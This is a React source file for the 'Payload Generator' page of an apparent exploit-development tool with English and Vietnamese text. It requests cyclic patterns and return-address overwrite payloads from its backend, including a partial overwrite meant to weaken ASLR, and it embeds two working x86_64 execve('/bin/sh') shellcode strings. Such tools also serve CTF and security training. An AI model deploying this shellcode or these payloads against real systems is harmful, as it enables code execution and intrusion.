import { useState } from "react";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import { Copy, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useLanguage } from "@/components/app-sidebar";
import { Alert, AlertDescription } from "@/components/ui/alert";

export default function PayloadGenerator() {
  const { toast } = useToast();
  const { lang } = useLanguage();
  const [offset, setOffset] = useState(264);
  const [address, setAddress] = useState("0x7ffffffde000");
  const [pattern, setPattern] = useState("");
  const [patternLength, setPatternLength] = useState(1000);
  const [partialPayload, setPartialPayload] = useState("");
  const [fullPayload, setFullPayload] = useState("");

  const generatePatternMutation = useMutation({
    mutationFn: async (length: number) => {
      return await apiRequest("POST", "/api/payloads/generate/cyclic", { length });
    },
    onSuccess: (data: any) => {
      setPattern(data.pattern);
      toast({
        title: lang === "vi" ? "Đã Tạo!" : "Generated!",
        description: lang === "vi" ? "Pattern đã được tạo thành công" : "Pattern generated successfully",
      });
    },
    onError: () => {
      toast({
        title: lang === "vi" ? "Lỗi" : "Error",
        description: lang === "vi" 
          ? "Không thể tạo pattern. Vui lòng kiểm tra độ dài và thử lại."
          : "Failed to generate pattern. Please check the length and try again.",
        variant: "destructive",
      });
    },
  });

  const generateOverwriteMutation = useMutation({
    mutationFn: async (data: { offset: number; address: string; type: string }) => {
      return await apiRequest("POST", "/api/payloads/generate/overwrite", data);
    },
    onSuccess: (data: any, variables) => {
      if (variables.type === "partial") {
        setPartialPayload(data.payload);
      } else {
        setFullPayload(data.payload);
      }
      toast({
        title: lang === "vi" ? "Đã Tạo!" : "Generated!",
        description: lang === "vi" ? "Payload đã được tạo thành công" : "Payload generated successfully",
      });
    },
    onError: () => {
      toast({
        title: lang === "vi" ? "Lỗi" : "Error",
        description: lang === "vi" 
          ? "Không thể tạo payload. Vui lòng kiểm tra offset và địa chỉ."
          : "Failed to generate payload. Please check the offset and address.",
        variant: "destructive",
      });
    },
  });

  const handleGeneratePattern = () => {
    generatePatternMutation.mutate(patternLength);
  };

  const handleGeneratePartial = () => {
    generateOverwriteMutation.mutate({ offset, address, type: "partial" });
  };

  const handleGenerateFull = () => {
    generateOverwriteMutation.mutate({ offset, address, type: "full" });
  };

  const shellcodes = [
    {
      name: "execve(\"/bin/sh\")",
      nameVi: "execve(\"/bin/sh\")",
      arch: "x86_64",
      code: "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05",
      bytes: 27,
    },
    {
      name: "execve(\"/bin/sh\") - Small",
      nameVi: "execve(\"/bin/sh\") - Nhỏ",
      arch: "x86_64",
      code: "\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05",
      bytes: 25,
    },
  ];

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: lang === "vi" ? "Đã Sao Chép!" : "Copied!",
      description: lang === "vi" ? "Đã sao chép vào clipboard" : "Copied to clipboard",
    });
  };

  return (
    <div className="flex flex-col flex-1 min-h-0 h-full">
      <div className="p-4 lg:p-6 space-y-4 lg:space-y-6 overflow-y-auto flex-1 min-h-0">
        <div className="space-y-2">
        <h1 className="text-2xl font-bold">
          {lang === "vi" ? "Tạo Payload" : "Payload Generator"}
        </h1>
        <p className="text-sm text-muted-foreground">
          {lang === "vi"
            ? "Tạo payload exploit với nhiều kỹ thuật khác nhau"
            : "Generate exploit payloads with various techniques"}
        </p>
      </div>

      <Tabs defaultValue="overwrite" className="space-y-4">
        <TabsList className="grid w-full grid-cols-3">
          <TabsTrigger value="overwrite" data-testid="tab-overwrite">
            {lang === "vi" ? "Ghi Đè" : "Overwrite"}
          </TabsTrigger>
          <TabsTrigger value="pattern" data-testid="tab-pattern">
            Pattern
          </TabsTrigger>
          <TabsTrigger value="shellcode" data-testid="tab-shellcode">
            Shellcode
          </TabsTrigger>
        </TabsList>

        <TabsContent value="overwrite" className="space-y-4">
          <Card className="p-4 lg:p-6 space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="overwrite-offset" className="text-xs font-medium uppercase tracking-wide">
                  {lang === "vi" ? "Offset Buffer" : "Buffer Offset"}
                </Label>
                <Input
                  id="overwrite-offset"
                  type="number"
                  value={offset}
                  onChange={(e) => setOffset(parseInt(e.target.value) || 0)}
                  className="font-mono"
                  data-testid="input-overwrite-offset"
                />
              </div>
              <div className="space-y-2">
                <Label htmlFor="target-address" className="text-xs font-medium uppercase tracking-wide">
                  {lang === "vi" ? "Địa Chỉ Mục Tiêu" : "Target Address"}
                </Label>
                <Input
                  id="target-address"
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  className="font-mono"
                  placeholder="0x7ffffffde000"
                  data-testid="input-target-address"
                />
              </div>
            </div>

            <div className="space-y-3">
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <Label className="text-sm font-medium">
                    {lang === "vi" ? "Ghi Đè Một Phần (12-bit)" : "Partial Overwrite (12-bit)"}
                  </Label>
                  <div className="flex gap-2">
                    <Button
                      variant="secondary"
                      size="sm"
                      onClick={handleGeneratePartial}
                      disabled={generateOverwriteMutation.isPending}
                    >
                      {lang === "vi" ? "Tạo" : "Generate"}
                    </Button>
                    {partialPayload && (
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => handleCopy(partialPayload)}
                        data-testid="button-copy-partial"
                      >
                        <Copy className="h-3 w-3" />
                      </Button>
                    )}
                  </div>
                </div>
                {partialPayload && (
                  <div className="bg-muted p-3 rounded font-mono text-xs overflow-x-auto">
                    {partialPayload}
                  </div>
                )}
                <p className="text-xs text-muted-foreground">
                  {lang === "vi"
                    ? "Bruteforce 12 bit thấp - giảm entropy ASLR"
                    : "Lower 12 bits bruteforce - reduces ASLR entropy"}
                </p>
              </div>

              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <Label className="text-sm font-medium">
                    {lang === "vi" ? "Ghi Đè Địa Chỉ Đầy Đủ" : "Full Address Overwrite"}
                  </Label>
                  <div className="flex gap-2">
                    <Button
                      variant="secondary"
                      size="sm"
                      onClick={handleGenerateFull}
                      disabled={generateOverwriteMutation.isPending}
                    >
                      {lang === "vi" ? "Tạo" : "Generate"}
                    </Button>
                    {fullPayload && (
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => handleCopy(fullPayload)}
                        data-testid="button-copy-full"
                      >
                        <Copy className="h-3 w-3" />
                      </Button>
                    )}
                  </div>
                </div>
                {fullPayload && (
                  <div className="bg-muted p-3 rounded font-mono text-xs overflow-x-auto">
                    {fullPayload}
                  </div>
                )}
                <p className="text-xs text-muted-foreground">
                  {lang === "vi"
                    ? "Ghi đè địa chỉ hoàn chỉnh - yêu cầu biết địa chỉ"
                    : "Complete address overwrite - requires known address"}
                </p>
              </div>
            </div>
          </Card>
        </TabsContent>

        <TabsContent value="pattern" className="space-y-4">
          <Card className="p-4 lg:p-6 space-y-4">
            <div className="space-y-2">
              <Label htmlFor="pattern-length" className="text-xs font-medium uppercase tracking-wide">
                {lang === "vi" ? "Độ Dài Pattern" : "Pattern Length"}
              </Label>
              <div className="flex gap-2">
                <Input
                  id="pattern-length"
                  type="number"
                  value={patternLength}
                  onChange={(e) => setPatternLength(parseInt(e.target.value) || 1000)}
                  className="font-mono"
                  data-testid="input-pattern-length"
                />
                <Button
                  onClick={handleGeneratePattern}
                  disabled={generatePatternMutation.isPending}
                  data-testid="button-generate-pattern"
                >
                  {generatePatternMutation.isPending 
                    ? (lang === "vi" ? "Đang Tạo..." : "Generating...") 
                    : (lang === "vi" ? "Tạo" : "Generate")}
                </Button>
              </div>
            </div>

            {pattern && (
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <Label className="text-sm font-medium">
                    {lang === "vi" ? "Pattern Chu Kỳ" : "Cyclic Pattern"}
                  </Label>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => handleCopy(pattern)}
                    data-testid="button-copy-pattern"
                  >
                    <Copy className="h-3 w-3" />
                  </Button>
                </div>
                <div className="bg-muted p-3 rounded font-mono text-xs overflow-x-auto max-h-40 overflow-y-auto">
                  {pattern}
                </div>
                <p className="text-xs text-muted-foreground">
                  {lang === "vi"
                    ? "Sử dụng pattern này để tìm offset buffer overflow chính xác"
                    : "Use this pattern to find exact buffer overflow offset"}
                </p>
              </div>
            )}
          </Card>
        </TabsContent>

        <TabsContent value="shellcode" className="space-y-4">
          <div className="grid gap-4">
            {shellcodes.map((shellcode, index) => (
              <Card key={index} className="p-4 lg:p-6 space-y-3">
                <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
                  <div className="space-y-1 flex-1">
                    <h3 className="text-sm font-semibold">
                      {lang === "vi" ? shellcode.nameVi : shellcode.name}
                    </h3>
                    <div className="flex gap-2">
                      <Badge variant="secondary" className="text-xs">
                        {shellcode.arch}
                      </Badge>
                      <Badge variant="secondary" className="text-xs">
                        {shellcode.bytes} bytes
                      </Badge>
                    </div>
                  </div>
                  <Button
                    variant="ghost"
                    size="sm"
                    onClick={() => handleCopy(shellcode.code)}
                    data-testid={`button-copy-shellcode-${index}`}
                  >
                    <Copy className="h-3 w-3" />
                  </Button>
                </div>
                <div className="bg-muted p-3 rounded font-mono text-xs overflow-x-auto">
                  {shellcode.code}
                </div>
              </Card>
            ))}
          </div>
        </TabsContent>
      </Tabs>
      </div>
    </div>
  );
}
